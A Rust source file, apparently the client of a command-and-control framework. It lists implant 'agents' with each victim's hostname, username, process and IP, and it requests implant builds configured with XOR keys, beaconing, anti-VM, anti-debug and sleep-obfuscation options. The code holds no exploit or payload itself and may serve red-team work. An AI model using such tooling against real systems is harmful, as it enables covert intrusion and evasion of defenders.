use crate::models::{self, AgentConfig, AgentDto, GenerateAgentRequest};
use std::time::Duration;

pub async fn fetch_agents(server_url: &str, token: &str) -> Result<Vec<models::Agent>, String> {
    let url = format!("{}/api/agents", server_url);
    let client = reqwest::Client::new();

    let response = client
        .get(&url)
        .header("Authorization", format!("Bearer {}", token))
        .timeout(Duration::from_secs(5))
        .send()
        .await
        .map_err(|e| format!("Fetch agents error: {}", e))?;

    let agents: Vec<AgentDto> = response
        .json()
        .await
        .map_err(|e| format!("Parse agents error: {}", e))?;

    Ok(agents
        .into_iter()
        .map(|a| models::Agent {
            id: a.agent_id,
            hostname: a.hostname,
            username: a.username,
            process_name: a.process_name,
            ip: a.ip,
            last_seen: Some(super::utils::format_timestamp(a.last_seen)),
            payload_type: a.payload_type,
            listener_name: a.listener_name,
        })
        .collect())
}

pub async fn generate_agent_with_config(
    server_url: &str,
    token: &str,
    config: &models::GenerateAgentDialog,
) -> Result<Vec<u8>, String> {
    let url = format!("{}/api/generate", server_url);
    let client = reqwest::Client::new();

    let agent_config = AgentConfig {
        host: config.host.clone(),
        port: config.port,
        uri_path: config.uri_path.clone(),
        user_agent: config.user_agent.clone(),
        xor_key: config.xor_key.clone(),
        beacon_interval: config.beacon_interval,
        anti_vm: config.anti_vm,
        anti_debug: config.anti_debug,
        headers: config.headers.clone(),
        use_sleep_obfuscation: config.use_sleep_obfuscation,
        sleep_jitter_percent: config.sleep_jitter_percent,
        encrypt_memory_on_sleep: config.encrypt_memory_on_sleep,
    };

    let payload = GenerateAgentRequest {
        listener_name: config.listener_name.clone(),
        payload_type: config.payload_type.clone(),
        config: agent_config,
    };

    let response = client
        .post(&url)
        .header("Authorization", format!("Bearer {}", token))
        .json(&payload)
        .timeout(Duration::from_secs(60))
        .send()
        .await
        .map_err(|e| format!("Generate agent error: {}", e))?;

    let status = response.status();

    if !status.is_success() {
        let error_msg = response
            .text()
            .await
            .unwrap_or_else(|_| "Unknown error".to_string());
        return Err(format!("Server returned error: {} - {}", status, error_msg));
    }

    let bytes = response
        .bytes()
        .await
        .map_err(|e| format!("Failed to read response: {}", e))?;

    Ok(bytes.to_vec())
}
